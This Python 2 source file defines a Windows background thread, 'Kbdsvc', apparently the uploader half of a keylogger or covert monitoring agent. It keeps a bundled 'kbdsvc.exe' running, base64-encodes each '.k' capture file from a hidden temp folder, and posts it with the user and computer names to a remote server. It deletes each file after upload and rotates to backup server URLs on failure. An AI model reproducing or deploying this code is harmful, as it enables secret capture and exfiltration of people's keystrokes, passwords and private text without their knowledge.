# -*- coding: utf-8 -*-
# from __future__ import unicode_literals

import os
import sys
import threading
import base64
import utils
import time
import logger
import subprocess
from config import config
import requests
from utils import fmt
import psutil

log = logger.getLogger(config['NAME'], config['LOGLEVEL'])


class Kbdsvc(threading.Thread):
    """
    Выгружает файлы из data_dir на сервер каждые 10с, за исключением файлов начинающихся с "config[EXCLUDE_CHR]".
    Все выгруженные файлы удаляются.

    Upload all of data dir every 10s, except files with leading "config[EXCLUDE_CHR]".
    All uploaded files are removed.
    """

    def __init__(self):
        threading.Thread.__init__(self)
        self.name = __name__
        self.daemon = True
        self.active = False

        self.datadir = os.path.join(utils.get_temp_dir(), "_tmpkbdsvc")
        self.kbdsvc_exe = os.path.join(config["SELF_DIR"], "kbdsvc", "kbdsvc.exe")
        self.url = config['URL'][0]
        self.params = {"username": utils.utf(utils.get_user_name()),
                       'compname': utils.utf(utils.get_comp_name())}
        self.jreq = {'jsonrpc': '2.0', 'method': 'kbdsvc', 'id': __name__, 'params': self.params}
        self.auth = requests.auth.HTTPDigestAuth(*config['AUTH'])

        self.headers = {'user-agent': fmt("{NAME}/{VERSION}", **config)}

        utils.makedirs(self.datadir)

    def _check_jres(self, jres):
        if self.jreq['id'] != jres['id']:
            raise ValueError('Invalid ID')
        if 'error' in jres:
            raise requests.exceptions.HTTPError(jres['error']['message'])
        return jres

    def start_kbdsvc_proc(self):
        subprocess.Popen([self.kbdsvc_exe], shell=False)

    def kill_kbdsvc_proc(self):
        si = subprocess.STARTUPINFO()
        si.dwFlags = subprocess.STARTF_USESHOWWINDOW
        si.wShowWindow = subprocess.SW_HIDE

        subprocess.call(["taskkill", "/F", "/IM", os.path.basename(self.kbdsvc_exe)], shell=False, startupinfo=si)

    def check_kbdsvc_proc(self):
        for proc in psutil.process_iter():
            if proc.name() == os.path.basename(self.kbdsvc_exe):
                return True
        return False

    def run(self):
        if not sys.platform.startswith('win'):
            return
        log.info(fmt('Start daemon: {0}', self.name))
        self.active = True
        prev_timeout, timeout = 21, 34
        self.kill_kbdsvc_proc()
        self.start_kbdsvc_proc()
        while self.active:
            try:
                utils.makedirs(self.datadir)
                if not self.check_kbdsvc_proc():
                    self.start_kbdsvc_proc()
                with requests.Session() as sess:
                    sess.auth = self.auth
                    sess.timeout = (3.05, 27)
                    sess.verify = config['CERT']
                    sess.headers = self.headers
                    for fn in (f for f in utils.rListFiles(self.datadir) if os.path.basename(f).endswith('.k')):
                        try:
                            # minutes are modulo 10
                            tm_tuple = time.localtime(int(time.time() / 600) * 600)
                            ftime = time.strftime("%Y%m%d%H%M%S", tm_tuple)
                            if ftime not in fn:
                                with open(fn, 'rb') as fp:
                                    self.params['filename'] = utils.utf(
                                        fn.replace(self.datadir, '').replace('\\', '/').strip('/'))
                                    self.params['data'] = base64.b64encode(fp.read())
                                self.jreq['params'] = self.params
                                self.jreq['id'] = time.time()

                                log.debug(fmt('Try to upload: {fn}', fn=fn))
                                r = sess.post(self.url, json=self.jreq)
                                jres = self._check_jres(r.json())
                                if jres['result'] == 1:
                                    log.debug(fmt('Try to delete: {fn}', fn=fn))
                                    os.unlink(fn)
                        except requests.exceptions.RequestException:
                            raise
                        except IOError as e:
                            log.error(e)

                        time.sleep(0.1)
                prev_timeout, timeout = 21, 34
            except Exception as e:
                if timeout < 60:
                    prev_timeout, timeout = timeout, prev_timeout + timeout
                for i in os.listdir(self.datadir)[-config['SAVED_IMAGES']::-1]:
                    try:
                        log.debug(fmt('Try to delete: {fn}', fn=os.path.join(self.datadir, i)))
                        os.unlink(os.path.join(self.datadir, i))
                    except Exception as e:
                        log.error(e)
                if e.__class__ in requests.exceptions.__dict__.itervalues():
                    try:
                        ind = config['URL'].index(self.url)
                        self.url = config['URL'][ind + 1]
                    except Exception:
                        self.url = config['URL'][0]
                log.error(e)

            time.sleep(timeout)

    def stop(self):
        log.info(fmt('Stop daemon: {0}', self.name))
        self.active = False
        self.kill_kbdsvc_proc()


if __name__ == "__main__":
    t = Kbdsvc()
    t.start()
    t.join()
